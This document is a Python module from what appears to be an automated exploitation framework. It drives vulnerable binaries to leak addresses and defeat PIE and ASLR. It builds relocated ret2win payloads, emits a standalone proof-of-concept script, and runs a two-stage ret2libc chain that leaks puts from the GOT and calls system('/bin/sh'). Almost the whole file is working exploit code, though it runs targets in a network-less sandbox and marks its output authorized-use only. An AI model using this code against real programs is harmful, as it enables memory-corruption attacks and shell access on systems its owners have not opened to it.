"""PIE exploitation via a runtime info-leak (Phase 9 frontier, analyst-in-the-loop).

A PIE binary loads at a randomized base, so static addresses are useless until a runtime
**info-leak** reveals a real address. This drives the target interactively in ONE process
(defeating live ASLR): read the leaked address from its output, compute the load base, send a
payload whose addresses are relocated to that base, and verify the exploit by an observable
success marker. The analyst supplies what the target leaks and how success shows (doc 15).
"""
from __future__ import annotations

import os
import re
import select
import subprocess
import time
from pathlib import Path

from ..dynamic import sandbox


def _kill(p):
    try:
        os.killpg(os.getpgid(p.pid), 9)
    except OSError:
        try:
            p.kill()
        except OSError:
            pass


def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                     payload_for_base, success_regex: str, timeout: float = 8.0,
                     mem_mb: int = 2048, base_from_leaks=None, leak_trigger: bytes = b"") -> dict:
    """Interactive single-process leak → relocate → exploit over stdin/stdout.

    Two ways to turn the leak into an image base:
      - `leak_base_offset` (analyst-gated): the static offset of the single symbol the target
        leaks, so base = leaked - leak_base_offset.
      - `base_from_leaks` (automatic): a callback given EVERY hex value in the leak burst that
        returns the recovered base (e.g. `exploit.recover_pie_base` bound to the target bytes),
        so the analyst need not say which symbol is leaked.
    `payload_for_base(base)->bytes` builds the relocated payload. Success = `success_regex`
    appears in the post-payload output.
    """
    rx = re.compile(leak_regex.encode("latin-1"))
    ok = re.compile(success_regex.encode("latin-1"))
    preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
    # The leak harness reads only the target's stdout, so it needs no control channel: contain
    # it fully (read-only fs, tmpfs, private pid + network namespace) when bwrap is available.
    exedir = str(Path(exe).resolve().parent)
    cmd = sandbox.isolate_prefix(exedir, net=False) + \
        [str(exe)] + [str(a) for a in base_argv]
    try:
        p = subprocess.Popen(cmd,
                             stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, start_new_session=True,
                             preexec_fn=preexec)
    except Exception as e:
        return {"ok": False, "reason": f"spawn failed: {e!r}"}

    if leak_trigger:                             # a format-string leak must be PROVOKED: send the
        try:                                     # %p dump first, then read the pointers it prints
            p.stdin.write(leak_trigger)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            pass

    def _vals(b):
        out = []
        for m in rx.finditer(b):
            grp = m.group(1) if m.groups() else m.group(0)
            try:
                out.append(int(grp, 16))
            except ValueError:
                pass
        return out

    deadline = time.time() + timeout
    buf = b""
    leaked = None
    last_data = time.time()
    try:
        while time.time() < deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                buf += chunk
                last_data = time.time()
                if rx.search(buf):
                    leaked = True
                    # a format-string leak prints its whole burst at once, then the target
                    # blocks on our payload read (no EOF, no exit) -- so once something matched,
                    # stop after a brief quiet gap rather than spinning to the deadline.
                    if base_from_leaks is None:
                        break
            elif p.poll() is not None:
                break
            elif leaked and (time.time() - last_data) > 0.3:
                break                                    # burst captured; target now awaits input
        vals = _vals(buf)
        if not vals:
            _kill(p)
            return {"ok": False, "reason": "no leak matched before the target read input",
                    "output": buf[:400].decode("latin-1", "ignore")}

        if base_from_leaks is not None:
            base = base_from_leaks(vals)
            if not base:
                _kill(p)
                return {"ok": False, "reason": "could not recover the image base from the leak",
                        "leaked": vals[:8], "output": buf[:400].decode("latin-1", "ignore")}
        else:
            base = vals[0] - leak_base_offset
        leaked = base + leak_base_offset if base_from_leaks is None else vals[0]
        payload = payload_for_base(base)
        sent_at = len(buf)          # only output AFTER this can confirm the RELOCATED payload worked
        try:
            p.stdin.write(payload)
            p.stdin.flush()
            p.stdin.close()
        except (BrokenPipeError, OSError):
            pass

        out = buf
        # A FRESH budget for the confirmation read: the leak may have arrived just before `deadline`,
        # which would otherwise leave this loop zero iterations and miss a genuine success marker.
        post_deadline = time.time() + timeout
        while time.time() < post_deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                out += chunk
            elif p.poll() is not None:
                break
        # Search ONLY the post-payload bytes: a success_regex that merely appears in the target's
        # normal startup/leak output (pre-payload) must not declare a false "demonstrated".
        return {"ok": True, "leaked": leaked, "base": base,
                "success": bool(ok.search(out[sent_at:])),
                "output": out[:800].decode("latin-1", "ignore")}
    finally:
        _kill(p)
        try:
            p.wait(timeout=2)
        except Exception:
            pass


def render_ret2win_script(leak_regex, leak_base_offset, off_win, offset) -> bytes:
    """A self-contained, stdlib-only reproducer: leak -> compute base -> ret2win. This is the
    portable PoC for a PIE target (the raw payload is base-specific and cannot be static)."""
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 PIE exploit (leak -> ret2win). Authorized-use only.\n"
        "import re, struct, subprocess, sys\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './poc/target.bin'\n"
        f"LEAK_RE = {leak_regex!r}\n"
        f"LEAK_OFF = {leak_base_offset:#x}   # static offset of the leaked symbol\n"
        f"WIN_OFF  = {off_win:#x}            # static offset of the win function\n"
        f"OFFSET   = {offset}                # overflow offset to saved return address\n"
        "def cyclic(n):\n"
        "    a=b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\n"
        "    out=bytearray(); i=0\n"
        "    while len(out)<n:\n"
        "        out+=bytes([a[i%len(a)]]); i+=1\n"
        "    return bytes(out[:n])\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE)\n"
        "leaked=None\n"
        "for line in p.stdout:                       # read whole lines: the address is complete\n"
        "    m=re.search(LEAK_RE.encode(),line)\n"
        "    if m: leaked=int((m.group(1) if m.groups() else m.group(0)),16); break\n"
        "if leaked is None:\n"
        "    sys.stderr.write('no leak captured\\n'); sys.exit(1)\n"
        "base=leaked-LEAK_OFF\n"
        "print('leaked %#x -> base %#x -> win %#x'%(leaked,base,base+WIN_OFF))\n"
        "p.stdin.write(cyclic(OFFSET)+struct.pack('<Q',base+WIN_OFF)+b'C'*8)\n"
        "p.stdin.close()\n"
        "print(p.stdout.read().decode('latin-1','ignore'))\n"
    ).encode()


# --- ret2libc WITH a runtime puts() leak -------------------------------------------------------
def _read_until(p, deadline, quiet=0.3):
    """Read a target's merged stdout until it stalls (a quiet gap) or exits; returns the bytes."""
    out, last = b"", time.time()
    while time.time() < deadline:
        r, _, _ = select.select([p.stdout], [], [], 0.1)
        if r:
            chunk = os.read(p.stdout.fileno(), 4096)
            if not chunk:
                break
            out += chunk
            last = time.time()
        elif p.poll() is not None:
            break
        elif out and (time.time() - last) > quiet:
            break
    return out


def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                  puts_off, system_off, binsh_off, ret_gadget=None, base_argv=(),
                  marker: bytes = b"LYKOS_R2L_9931", timeout: float = 8.0,
                  mem_mb: int = 2048) -> dict:
    """Two-stage ret2libc that defeats ASLR with a puts() info-leak, confirmed by a spawned shell.

    Stage 1 (`build_leak_puts`) calls puts(puts@GOT), printing the libc address of puts as raw
    little-endian bytes, then returns to `ret_to` so the loop reads again. `resolve_libc_base`
    subtracts the symbol's offset to recover the libc base; stage 2 (`build_ret2system`) then calls
    system(base+binsh_off) with the resolved system address. `system` needs a 16-byte-aligned rsp,
    and the frame parity of the re-entered stack is environment-dependent (argv/env change it under
    the sandbox), so stage 2's alignment (with/without a `ret` pad) is tried BOTH ways on a fresh
    process each; stage 1's leak is left unpadded, which is the parity that reaches puts on both
    paths -- padding it too would cascade into the return and change stage 2's parity unpredictably.
    Success = the spawned shell echoes `marker` -- an observable a crash or a wrong address can never
    produce. Returns {ok, base, system, leaked, align, ...}.
    """
    from . import rop
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    last_leaked = None
    # stage-2 alignment: even parity (no pad), then odd (one `ret`); one of the two is 16-aligned.
    for align in ([None, ret_gadget] if ret_gadget is not None else [None]):
        # A couple of tries per parity: the leak is one process, and a rare short read on stage 1
        # is worth a retry before ruling the parity out.
        for _ in range(3):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                       # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                _read_until(p, time.time() + 0.5)        # drain the target's first prompt/banner
                s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got, puts_plt=puts_plt,
                                         ret_to=ret_to, ret_gadget=None)   # leak stays unpadded
                try:
                    p.stdin.write(s1)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                burst = _read_until(p, time.time() + timeout / 2)
                raw = burst.split(b"\n", 1)[0][:6]       # puts prints the 6-byte pointer then \n
                if len(raw) < 6:
                    continue
                leaked = int.from_bytes(raw.ljust(8, b"\x00"), "little")
                base = rop.resolve_libc_base(leaked, puts_off)
                last_leaked = leaked
                if not base:
                    continue                             # not the pointer we assumed; retry/parity
                system, binsh = base + system_off, base + binsh_off
                s2 = rop.build_ret2system(offset, pop_rdi, binsh, system, 0, ret_gadget=align)
                try:
                    p.stdin.write(s2)
                    p.stdin.flush()
                    time.sleep(0.3)
                    p.stdin.write(b"echo " + marker + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break                                # stage 2 killed the process: wrong parity
                # A spawned shell may echo after a gap under the sandbox, so wait out a longer quiet
                # window before concluding the marker never came.
                out = _read_until(p, time.time() + timeout, quiet=1.5)
                if marker in out:
                    return {"ok": True, "base": base, "system": system, "binsh": binsh,
                            "leaked": leaked, "align": align,
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for stream in (p.stdin, p.stdout):       # close first: no buffered flush to a dead
                    try:                                  # pipe raising an unraisable BrokenPipe
                        if stream is not None:
                            stream.close()
                    except Exception:                     # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                        # noqa: BLE001
                    pass
    return {"ok": False, "reason": "no shell confirmed (leak captured but ret2libc did not spawn a "
                                   "shell under either stack alignment)", "leaked": last_leaked}
